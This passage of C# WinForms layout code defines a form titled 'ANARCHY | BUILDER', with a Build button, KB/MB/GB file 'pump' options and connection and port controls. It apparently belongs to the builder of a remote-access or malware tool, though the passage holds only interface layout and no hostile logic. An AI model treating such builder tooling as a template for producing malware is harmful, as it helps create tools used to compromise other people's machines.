        this.tabPage3.Text = "Build";
        this.btnBuild.BorderRadius = 8;
        this.btnBuild.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
        this.btnBuild.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
        this.btnBuild.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
        this.btnBuild.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
        this.btnBuild.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
        this.btnBuild.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.btnBuild.ForeColor = System.Drawing.Color.White;
        this.btnBuild.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.BackwardDiagonal;
        this.btnBuild.Location = new System.Drawing.Point(151, 311);
        this.btnBuild.Name = "btnBuild";
        this.btnBuild.Size = new System.Drawing.Size(409, 45);
        this.btnBuild.TabIndex = 137;
        this.btnBuild.Text = "Build";
        this.btnBuild.Click += new System.EventHandler(BtnBuild_Click);
        this.guna2PictureBox1.Image = (System.Drawing.Image)resources.GetObject("guna2PictureBox1.Image");
        this.guna2PictureBox1.ImageRotate = 0f;
        this.guna2PictureBox1.Location = new System.Drawing.Point(187, 6);
        this.guna2PictureBox1.Name = "guna2PictureBox1";
        this.guna2PictureBox1.Size = new System.Drawing.Size(337, 315);
        this.guna2PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
        this.guna2PictureBox1.TabIndex = 136;
        this.guna2PictureBox1.TabStop = false;
        this.guna2Panel2.BackColor = System.Drawing.Color.Transparent;
        this.guna2Panel2.Controls.Add(this.siticoneControlBox4);
        this.guna2Panel2.Controls.Add(this.siticoneControlBox3);
        this.guna2Panel2.Controls.Add(this.Label22);
        this.guna2Panel2.CustomBorderColor = System.Drawing.Color.FromArgb(64, 72, 75);
        this.guna2Panel2.CustomBorderThickness = new System.Windows.Forms.Padding(0, 0, 1, 0);
        this.guna2Panel2.Dock = System.Windows.Forms.DockStyle.Top;
        this.guna2Panel2.Location = new System.Drawing.Point(0, 0);
        this.guna2Panel2.Name = "guna2Panel2";
        this.guna2Panel2.ShadowDecoration.Color = System.Drawing.Color.White;
        this.guna2Panel2.ShadowDecoration.Depth = 15;
        this.guna2Panel2.Size = new System.Drawing.Size(701, 41);
        this.guna2Panel2.TabIndex = 115;
        this.siticoneControlBox4.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.siticoneControlBox4.BackColor = System.Drawing.Color.Transparent;
        this.siticoneControlBox4.BorderRadius = 10;
        this.siticoneControlBox4.ControlBoxType = Siticone.UI.WinForms.Enums.ControlBoxType.MinimizeBox;
        this.siticoneControlBox4.FillColor = System.Drawing.Color.Transparent;
        this.siticoneControlBox4.HoveredState.Parent = this.siticoneControlBox4;
        this.siticoneControlBox4.IconColor = System.Drawing.Color.White;
        this.siticoneControlBox4.Location = new System.Drawing.Point(602, 5);
        this.siticoneControlBox4.Name = "siticoneControlBox4";
        this.siticoneControlBox4.ShadowDecoration.Parent = this.siticoneControlBox4;
        this.siticoneControlBox4.Size = new System.Drawing.Size(45, 29);
        this.siticoneControlBox4.TabIndex = 21;
        this.siticoneControlBox3.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.siticoneControlBox3.BackColor = System.Drawing.Color.Transparent;
        this.siticoneControlBox3.BorderRadius = 10;
        this.siticoneControlBox3.FillColor = System.Drawing.Color.Transparent;
        this.siticoneControlBox3.HoveredState.Parent = this.siticoneControlBox3;
        this.siticoneControlBox3.IconColor = System.Drawing.Color.White;
        this.siticoneControlBox3.Location = new System.Drawing.Point(653, 5);
        this.siticoneControlBox3.Name = "siticoneControlBox3";
        this.siticoneControlBox3.PressedColor = System.Drawing.Color.DarkRed;
        this.siticoneControlBox3.ShadowDecoration.Parent = this.siticoneControlBox3;
        this.siticoneControlBox3.Size = new System.Drawing.Size(45, 29);
        this.siticoneControlBox3.TabIndex = 20;
        this.Label22.AutoSize = true;
        this.Label22.BackColor = System.Drawing.Color.Transparent;
        this.Label22.Font = new System.Drawing.Font("ProFont for Powerline", 15.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
        this.Label22.ForeColor = System.Drawing.Color.White;
        this.Label22.Location = new System.Drawing.Point(6, 10);
        this.Label22.Name = "Label22";
        this.Label22.Size = new System.Drawing.Size(197, 21);
        this.Label22.TabIndex = 19;
        this.Label22.Text = "ANARCHY | BUILDER";
        this.guna2DragControl1.DockIndicatorTransparencyValue = 0.6;
        this.guna2DragControl1.TargetControl = this.guna2Panel2;
        this.guna2DragControl1.UseTransparentDrag = true;
        this.guna2Elipse1.BorderRadius = 15;
        this.guna2Elipse1.TargetControl = this;
        this.guna2RadioButton1.AutoSize = true;
        this.guna2RadioButton1.Checked = true;
        this.guna2RadioButton1.CheckedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
        this.guna2RadioButton1.CheckedState.BorderThickness = 0;
        this.guna2RadioButton1.CheckedState.FillColor = System.Drawing.Color.Crimson;
        this.guna2RadioButton1.CheckedState.InnerColor = System.Drawing.Color.White;
        this.guna2RadioButton1.CheckedState.InnerOffset = -4;
        this.guna2RadioButton1.ForeColor = System.Drawing.Color.GhostWhite;
        this.guna2RadioButton1.Location = new System.Drawing.Point(201, 101);
        this.guna2RadioButton1.Name = "guna2RadioButton1";
        this.guna2RadioButton1.Size = new System.Drawing.Size(46, 25);
        this.guna2RadioButton1.TabIndex = 143;
        this.guna2RadioButton1.TabStop = true;
        this.guna2RadioButton1.Text = "KB";
        this.guna2RadioButton1.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(125, 137, 149);
        this.guna2RadioButton1.UncheckedState.BorderThickness = 2;
        this.guna2RadioButton1.UncheckedState.FillColor = System.Drawing.Color.Transparent;
        this.guna2RadioButton1.UncheckedState.InnerColor = System.Drawing.Color.Transparent;
        this.guna2RadioButton1.CheckedChanged += new System.EventHandler(Kbpump_CheckedChanged);
        this.guna2RadioButton2.AutoSize = true;
        this.guna2RadioButton2.CheckedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
        this.guna2RadioButton2.CheckedState.BorderThickness = 0;
        this.guna2RadioButton2.CheckedState.FillColor = System.Drawing.Color.Crimson;
        this.guna2RadioButton2.CheckedState.InnerColor = System.Drawing.Color.White;
        this.guna2RadioButton2.CheckedState.InnerOffset = -4;
        this.guna2RadioButton2.ForeColor = System.Drawing.Color.GhostWhite;
        this.guna2RadioButton2.Location = new System.Drawing.Point(265, 101);
        this.guna2RadioButton2.Name = "guna2RadioButton2";
        this.guna2RadioButton2.Size = new System.Drawing.Size(51, 25);
        this.guna2RadioButton2.TabIndex = 144;
        this.guna2RadioButton2.Text = "MB";
        this.guna2RadioButton2.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(125, 137, 149);
        this.guna2RadioButton2.UncheckedState.BorderThickness = 2;
        this.guna2RadioButton2.UncheckedState.FillColor = System.Drawing.Color.Transparent;
        this.guna2RadioButton2.UncheckedState.InnerColor = System.Drawing.Color.Transparent;
        this.guna2RadioButton2.CheckedChanged += new System.EventHandler(MBpump_CheckedChanged);
        this.guna2RadioButton3.AutoSize = true;
        this.guna2RadioButton3.CheckedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
        this.guna2RadioButton3.CheckedState.BorderThickness = 0;
        this.guna2RadioButton3.CheckedState.FillColor = System.Drawing.Color.Crimson;
        this.guna2RadioButton3.CheckedState.InnerColor = System.Drawing.Color.White;
        this.guna2RadioButton3.CheckedState.InnerOffset = -4;
        this.guna2RadioButton3.ForeColor = System.Drawing.Color.GhostWhite;
        this.guna2RadioButton3.Location = new System.Drawing.Point(340, 101);
        this.guna2RadioButton3.Name = "guna2RadioButton3";
        this.guna2RadioButton3.Size = new System.Drawing.Size(48, 25);
        this.guna2RadioButton3.TabIndex = 145;
        this.guna2RadioButton3.Text = "GB";
        this.guna2RadioButton3.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(125, 137, 149);
        this.guna2RadioButton3.UncheckedState.BorderThickness = 2;
        this.guna2RadioButton3.UncheckedState.FillColor = System.Drawing.Color.Transparent;
        this.guna2RadioButton3.UncheckedState.InnerColor = System.Drawing.Color.Transparent;
        this.guna2RadioButton3.CheckedChanged += new System.EventHandler(siticoneOSToggleSwith3_CheckedChanged);
        base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
        base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
        this.BackColor = System.Drawing.Color.FromArgb(30, 32, 37);
        base.ClientSize = new System.Drawing.Size(701, 447);
        base.Controls.Add(this.guna2Panel2);
        base.Controls.Add(this.hopeTabPage1);
        base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
        base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
        base.Margin = new System.Windows.Forms.Padding(2);
        base.MaximizeBox = false;
        this.MaximumSize = new System.Drawing.Size(1920, 1080);
        this.MinimumSize = new System.Drawing.Size(190, 40);
        base.Name = "FormBuilder";
        base.ShowIcon = false;
        base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
        this.Text = "Builder";
        base.Load += new System.EventHandler(Builder_Load);
        ((System.ComponentModel.ISupportInitialize)this.picIcon).EndInit();
        this.RemovePort.ResumeLayout(false);
        this.hopeTabPage1.ResumeLayout(false);
        this.Connection.ResumeLayout(false);
        this.guna2GroupBox1.ResumeLayout(false);
        this.guna2GroupBox1.PerformLayout();
        this.ipremove.ResumeLayout(false);
        this.tabPage1.ResumeLayout(false);
        this.tabPage1.PerformLayout();
        ((System.ComponentModel.ISupportInitialize)this.numDelay).EndInit();
        this.tabPage2.ResumeLayout(false);
        this.tabPage2.PerformLayout();
        ((System.ComponentModel.ISupportInitialize)this.pictureBox1).EndInit();
        this.tabPage4.ResumeLayout(false);
        this.tabPage4.PerformLayout();
        this.tabPage3.ResumeLayout(false);
        ((System.ComponentModel.ISupportInitialize)this.guna2PictureBox1).EndInit();
        this.guna2Panel2.ResumeLayout(false);
        this.guna2Panel2.PerformLayout();
        base.ResumeLayout(false);
    }
}